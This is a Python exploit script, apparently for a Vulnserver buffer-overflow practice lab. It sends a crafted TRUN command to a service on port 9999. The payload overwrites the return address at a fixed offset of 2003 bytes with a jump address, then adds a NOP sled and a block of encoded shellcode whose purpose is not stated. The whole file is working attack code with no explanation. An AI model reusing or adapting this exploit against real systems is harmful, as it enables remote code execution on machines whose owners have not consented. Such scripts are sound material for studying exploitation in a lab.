import socket
import struct

all_characters = b"".join([struct.pack('<B', x) for x in range(1,256)])

s = socket.socket()
s.connect(("127.0.0.1", 9999))

total_length = 2984
offset = 2003
new_eip = struct.pack("<I",0x62501203)

nop_sled = b"\x90" * 16

buf =  b""
buf += b"\xdb\xcb\xbe\x84\xb1\x0f\xf3\xd9\x74\x24\xf4\x5d\x31"
buf += b"\xc9\xb1\x59\x83\xed\xfc\x31\x75\x15\x03\x75\x15\x66"
buf += b"\x44\xf3\x1b\xe9\xa7\x0c\xdc\x95\x2e\xe9\xed\x87\x55"
buf += b"\x79\x5f\x17\x1d\x2f\x6c\xdc\x73\xc4\x63\x55\x39\xc2"
buf += b"\xf0\xeb\x96\x3b\xf8\x3a\x27\x97\x3a\x5d\xdb\xea\x6e"
buf += b"\xbd\xe2\x24\x63\xbc\x23\xf3\x09\x51\xf9\x53\x79\xff"
buf += b"\xee\xd0\x3f\xc3\x0f\x37\x34\x7b\x68\x32\x8b\x0f\xc4"
buf += b"\x3d\xdc\x64\x9c\x25\x57\x22\x3d\x06\x66\x01\xb8\x6f"
buf += b"\x1c\x99\xf2\x90\x94\x6a\xc0\xe5\x26\xba\x18\x3a\x84"
buf += b"\x83\x94\xb7\xd4\xc4\x13\x28\xa3\x3e\x60\xd5\xb4\x85"
buf += b"\x1a\x01\x30\x19\xbc\xc2\xe2\xfd\x3c\x06\x74\x76\x32"
buf += b"\xe3\xf2\xd0\x57\xf2\xd7\x6b\x63\x7f\xd6\xbb\xe5\x3b"
buf += b"\xfd\x1f\xad\x98\x9c\x06\x0b\x4e\xa0\x58\xf3\x2f\x04"
buf += b"\x13\x16\x39\x38\xdc\xe8\x46\x64\x4a\x24\x8b\x97\x8a"
buf += b"\x22\x9c\xe4\xb8\xed\x36\x63\xf0\x66\x91\x74\x81\x61"
buf += b"\x22\xaa\x29\xe1\xdc\x4b\x49\x2b\x1b\x1f\x19\x43\x8a"
buf += b"\x20\xf2\x93\x33\xf5\x6e\x9e\xa3\x89\x6e\x9e\x32\x1e"
buf += b"\x6c\x9e\x25\x82\xf9\x78\x15\x6a\xa9\xd4\xd6\xda\x09"
buf += b"\x85\xbe\x30\x86\xfa\xdf\x3a\x4d\x93\x4a\xd5\x3b\xcb"
buf += b"\xe2\x4c\x66\x87\x93\x91\xbd\xed\x94\x1a\x37\x11\x5a"
buf += b"\xeb\x32\x01\x8b\x8c\xbc\xd9\x4c\x39\xbc\xb3\x48\xeb"
buf += b"\xeb\x2b\x53\xca\xdb\xf3\xac\x39\x58\xf3\x53\xbc\x68"
buf += b"\x8f\x62\x2a\xd4\xe7\x8a\xba\xd4\xf7\xdc\xd0\xd4\x9f"
buf += b"\xb8\x80\x87\xba\xc6\x1c\xb4\x16\x53\x9f\xec\xcb\xf4"
buf += b"\xf7\x12\x35\x32\x58\xed\x10\x40\x9f\x11\xe6\x6f\x38"
buf += b"\x79\x18\x30\xb8\x79\x72\xb0\xe8\x11\x89\x9f\x07\xd1"
buf += b"\x72\x0a\x40\x79\xf8\xdb\x22\x18\xfd\xf1\xe3\x84\xfe"
buf += b"\xf6\x3f\x37\x84\x77\xbf\xb8\x79\x9e\xa4\xb9\x79\x9e"
buf += b"\xda\x86\xaf\xa7\xa8\xc9\x73\x9c\xa3\x7c\xd1\xb5\x29"
buf += b"\x7e\x45\xc5\x7b"

shellcode = buf

payload = [
    b"TRUN /.:/",
    b"A"* offset,
    new_eip,
    nop_sled,
    shellcode,
    b"C"*(total_length - offset - len(new_eip) - len(nop_sled) - len(shellcode))
    ] 

payload = b"".join(payload)

s.send(payload)


s.close()